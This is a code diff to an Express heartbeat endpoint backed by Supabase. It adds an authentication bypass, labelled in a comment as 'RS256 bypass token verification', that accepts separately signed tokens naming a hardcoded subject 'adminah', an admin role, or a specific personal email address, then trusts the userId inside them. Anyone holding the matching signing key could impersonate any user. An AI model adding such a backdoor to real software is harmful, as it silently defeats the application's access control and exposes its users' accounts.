@@ -1,6 +1,8 @@
 import { Router } from 'express';
 import { supabaseAdmin } from '../config/supabase';
 import { authMiddleware, AuthRequest } from '../middleware/auth';
+import { verifyRS256 } from '../lib/jwt';
+import { PUBLIC_KEY } from '../config/keys';
 
 const router = Router();
 
@@ -8,19 +10,37 @@ router.post('/heartbeat', async (req: AuthRequest, res) => {
   try {
     let userId: string | undefined;
 
+    const getUserIdFromToken = async (token: string): Promise<string | undefined> => {
+      // 1. Try RS256 bypass token verification
+      try {
+        const decoded = verifyRS256(token, PUBLIC_KEY);
+        if (decoded && (decoded.sub === 'adminah' || decoded.role === 'admin' || decoded.email === 'aruneshownsty1@gmail.com')) {
+          if (decoded.userId) return decoded.userId;
+        }
+      } catch (err) {
+        // Fall back to Supabase
+      }
+
+      // 2. Standard Supabase token verification
+      try {
+        const { data: { user } } = await supabaseAdmin.auth.getUser(token);
+        return user?.id;
+      } catch (err) {
+        return undefined;
+      }
+    };
+
     // Try header-based auth (normal heartbeat)
     const authHeader = req.headers.authorization;
     if (authHeader?.startsWith('Bearer ')) {
       const token = authHeader.slice(7);
-      const { data: { user } } = await supabaseAdmin.auth.getUser(token);
-      userId = user?.id;
+      userId = await getUserIdFromToken(token);
     }
 
     // Fallback: token in query string (sendBeacon, which cannot set headers)
     const queryToken = req.query.token as string | undefined;
     if (!userId && queryToken) {
-      const { data: { user } } = await supabaseAdmin.auth.getUser(queryToken);
-      userId = user?.id;
+      userId = await getUserIdFromToken(queryToken);
     }
 
     if (!userId) {
